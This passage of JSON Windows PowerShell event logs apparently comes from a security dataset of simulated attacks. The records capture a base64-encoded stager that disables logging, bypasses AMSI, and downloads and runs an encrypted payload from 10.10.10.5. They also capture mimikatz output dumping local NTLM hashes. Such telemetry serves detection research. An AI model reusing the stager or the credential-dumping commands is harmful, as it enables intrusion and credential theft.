AG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAGwAVQBlACgAJABuAHUATABsACwAJAB0AHIAdQBFACkAOwB9ADsAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAFIAVgBpAEMARQBQAG8AaQBuAFQATQBhAE4AQQBnAGUAUgBdADoAOgBFAHgAcABlAGMAdAAxADAAMABDAG8ATgBUAEkAbgB1AGUAPQAwADsAJAA1ADUARgA9AE4ARQB3AC0ATwBCAEoARQBjAFQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAEkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBPAGQASQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVABSAEkATgBHACgAWwBDAE8AbgB2AEUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAFMARQA2ADQAUwBUAFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADUAZgAuAEgARQBBAEQARQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUANQBGAC4AUABSAE8AeABZAD0AWwBTAHkAUwB0AEUATQAuAE4AZQBUAC4AVwBFAGIAUgBlAFEAdQBFAFMAVABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBPAFgAWQA7ACQANQA1AEYALgBQAFIATwBYAFkALgBDAFIARQBkAEUAbgB0AEkAQQBsAFMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4AZQBUAC4AQwBSAEUAZABFAG4AdABJAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAEYAYQB1AGwAVABOAGUAdAB3AG8AUgBLAEMAUgBFAGQAZQBuAFQASQBBAGwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADUAZgAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAWABUAC4ARQBuAGMATwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQBUAGUAUwAoACcAawApAGcASgAlAHgAMQBeAFMARABVAEcAIQB1AEsAbQA/AEwAdgAqAGIAZQBbAC0AbwBpAHkALwA0AHcAVAB8ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANQA1AGYALgBIAEUAYQBkAEUAcgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAVgB4AGoAQgBwAEUAdQA9ADUARQBqAEUASQAwAGwARQA1AFcAWAAwAFAAdABSAGEARAAvAEEASwA1AFIATwBQAFYAeABVAD0AIgApADsAJABEAEEAVABBAD0AJAA1ADUAZgAuAEQAbwB3AE4ATABvAEEARABEAGEAVABBACgAJABzAGUAUgArACQAVAApADsAJABJAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AGEAPQAkAEQAQQBUAEEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAEUATgBHAHQASABdADsALQBqAE8ASQBuAFsAQwBIAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\\r\\n        Engine Version = 5.1.18362.752\\r\\n        Runspace ID = fb249e3f-a85b-4722-b17c-49b652225701\\r\\n        Pipeline ID = 1\\r\\n        Command Name = Write-Output\\r\\n        Command Type = Cmdlet\\r\\n        Script Name = \\r\\n        Command Path = \\r\\n        Sequence Number = 21494\\r\\n        User = THESHIRE\\\\pgustavo\\r\\n        Connected User = \\r\\n        Shell ID = Microsoft.PowerShell\\r\\n\",\"Payload\":\"CommandInvocation(Write-Output): \\\"Write-Output\\\"\\r\\nParameterBinding(Write-Output): name=\\\"InputObject\\\"; value=\\\"\\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  4 2020 20:16:54\\n .## ^ ##.  \\\"A La Vie, A L'Amour\\\" - (oe.eo)\\n ## / \\\\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\\n ## \\\\ / ##       &gt; http://blog.gentilkiwi.com/mimikatz\\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\\n  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/\\n\\nmimikatz(powershell) # lsadump::lsa /patch\\nDomain : WORKSTATION5 / S-1-5-21-1549354820-3669603161-4025758380\\n\\nRID  : 000001f7 (503)\\nUser : DefaultAccount\\nLM   : \\nNTLM : \\n\\nRID  : 000001f5 (501)\\nUser : Guest\\nLM   : \\nNTLM : \\n\\nRID  : 000001f4 (500)\\nUser : wardog\\nLM   : \\nNTLM : 42ddb2963bbe8f1c075fc869d3bce33e\\n\\nRID  : 000001f8 (504)\\nUser : WDAGUtilityAccount\\nLM   : \\nNTLM : 45a313f1860be24e967e55b94649aa31\\n, ...\\\"\\r\\n\",\"Domain\":\"THESHIRE\",\"ExecutionProcessID\":1648,\"host\":\"wec.internal.cloudapp.net\",\"Severity\":\"INFO\",\"ActivityID\":\"{22CB5860-CC22-0000-6A9B-358A906BD601}\",\"SeverityValue\":2,\"EventID\":4103,\"UserID\":\"S-1-5-21-1363495622-3806888128-621328882-1104\",\"ProviderGuid\":\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\",\"RecordNumber\":12833,\"SourceModuleType\":\"im_msvistalog\",\"Keywords\":0,\"tags\":[\"mordorDataset\"]}",
              "{\"@version\":\"1\",\"EventType\":\"INFO\",\"ThreadID\":0,\"EventTime\":\"2020-08-07 10:39:50\",\"Task\":8,\"Channel\":\"Windows PowerShell\",\"SourceName\":\"PowerShell\",\"Opcode\":\"Info\",\"Hostname\":\"WORKSTATION5.theshire.local\",\"@timestamp\":\"2020-08-07T14:39:58.690Z\",\"Message\":\"Pipeline execution details for command line:                         Write-Output $Output\\n. \\r\\n\\r\\nContext Information: \\r\\n\\tDetailSequence=1\\r\\n\\tDetailTotal=1\\r\\n\\r\\n\\tSequenceNumber=21493\\r\\n\\r\\n\\tUserId=THESHIRE\\\\pgustavo\\r\\n\\tHostName=Default Host\\r\\n\\tHostVersion=5.1.18362.752\\r\\n\\tHostId=18d2a904-7116-4dc5-8a92-4afeea74e2f1\\r\\n\\tHostApplication=C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAUwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAHIAcwBpAE8ATgAuAE0AYQBKAE8AcgAgAC0AZwBFACAAMwApAHsAJAA5ADMAOQA9AFsAUgBFAGYAXQAuAEEAUwBzAEUAbQBiAGwAeQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJAA5ADMAOQApAHsAJAA3ADkAMAA9ACQAOQAzADkALgBHAGUAVABWAEEATABVAGUAKAAkAE4AdQBMAEwAKQA7AEkARgAoACQANwA5ADAAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAEUAQwB0AGkAbwBOAFMALgBHAEUATgBlAHIASQBjAC4ARABJAEMAdABJAE8AbgBBAHIAWQBbAHMAdAByAEkAbgBnACwAUwBZAFMAdABFAE0ALgBPAEIAagBlAEMAdABdAF0AOgA6AG4AZQB3ACgAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA3ADkAMABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABTAGUAewBbAFMAQwByAEkAUAB0AEIATABvAGMASwBdAC4AIgBHAGUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBFACgAJABOAFUATABMACwAKABOAGUAdwAtAE8AQgBKAGUAQwB0ACAAQwBPAEwAbABlAGMAVABpAE8ATgBTAC4ARwBlAG4AZQBSAGkAYwAuAEgAQQBzAEgAUwBFAHQAWwBTAFQAcgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAFMAcwBFAE0AYgBMAFkALgBHAGUAdABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAGUARgAuAEcAZQBUAEYASQBlAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAGwAVQBlACgAJABuAHUATABsACwAJAB0AHIAdQBFACkAOwB9ADsAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAFIAVgBpAEMARQBQAG8AaQBuAFQATQBhAE4AQQBnAGUAUgBdADoAOgBFAHgAcABlAGMAdAAxADAAMABDAG8ATgBUAEkAbgB1AGUAPQAwADsAJAA1ADUARgA9AE4ARQB3AC0ATwBCAEoARQBjAFQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAEkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBPAGQASQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVABSAEkATgBHACgAWwBDAE8AbgB2AEUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAFMARQA2ADQAUwBUAFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADUAZgAuAEgARQBBAEQARQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUANQBGAC4AUABSAE8AeABZAD0AWwBTAHkAUwB0AEUATQAuAE4AZQBUAC4AVwBFAGIAUgBlAFEAdQBFAFMAVABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBPAFgAWQA7ACQANQA1AEYALgBQAFIATwBYAFkALgBDAFIARQBkAEUAbgB0AEkAQQBsAFMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4AZQBUAC4AQwBSAEUAZABFAG4AdABJAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAEYAYQB1AGwAVABOAGUAdAB3AG8AUgBLAEMAUgBFAGQAZQBuAFQASQBBAGwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADUAZgAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAWABUAC4ARQBuAGMATwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQBUAGUAUwAoACcAawApAGcASgAlAHgAMQBeAFMARABVAEcAIQB1AEsAbQA/AEwAdgAqAGIAZQBbAC0AbwBpAHkALwA0AHcAVAB8ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANQA1AGYALgBIAEUAYQBkAEUAcgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAVgB4AGoAQgBwAEUAdQA9ADUARQBqAEUASQAwAGwARQA1AFcAWAAwAFAAdABSAGEARAAvAEEASwA1AFIATwBQAFYAeABVAD0AIgApADsAJABEAEEAVABBAD0AJAA1ADUAZgAuAEQAbwB3AE4ATABvAEEARABEAGEAVABBACgAJABzAGUAUgArACQAVAApADsAJABJAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AGEAPQAkAEQAQQBUAEEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAEUATgBHAHQASABdADsALQBqAE8ASQBuAFsAQwBIAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\\r\\n\\tEngineVersion=5.1.18362.752\\r\\n\\tRunspaceId=fb249e3f-a85b-4722-b17c-49b652225701\\r\\n\\tPipelineId=1\\r\\n\\tScriptName=\\r\\n\\tCommandLine=                        Write-Output $Output\\n \\r\\n\\r\\nDetails: \\r\\nCommandInvocation(Write-Output): \\\"Write-Output\\\"\\r\\nParameterBinding(Write-Output): name=\\\"InputObject\\\"; value=\\\"\\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  4 2020 20:16:54\\n .## ^ ##.  \\\"A La Vie, A L'Amour\\\" - (oe.eo)\\n ## / \\\\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\\n ## \\\\ / ##       > http://blog.gentilkiwi.com/mimikatz\\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\\n\\nmimikatz(powershell) # lsadump::lsa /patch\\nDomain : WORKSTATION5 / S-1-5-21-1549354820-3669603161-4025758380\\n\\nRID  : 000001f7 (503)\\nUser : DefaultAccount\\nLM   : \\nNTLM : \\n\\nRID  : 000001f5 (501)\\nUser : Guest\\nLM   : \\nNTLM : \\n\\nRID  : 000001f4 (500)\\nUser : wardog\\nLM   : \\nNTLM : 42ddb2963bbe8f1c075fc869d3bce33e\\n\\nRID  : 000001f8 (504)\\nUser : WDAGUtilityAccount\\nLM   : \\nNTLM : 45a313f1860be24e967e55b94649aa31\\n, ...\\\"\\r\\n\",\"Category\":\"Pipeline Execution Details\",\"SourceModuleName\":\"eventlog\",\"EventReceivedTime\":\"2020-08-07 10:39:58\",\"port\":60122,\"ExecutionProcessID\":0,\"host\":\"wec.internal.cloudapp.net\",\"Severity\":\"INFO\",\"SeverityValue\":2,\"EventID\":800,\"RecordNumber\":12473,\"SourceModuleType\":\"im_msvistalog\",\"Keywords\":36028797018963968,\"tags\":[\"mordorDataset\"]}",
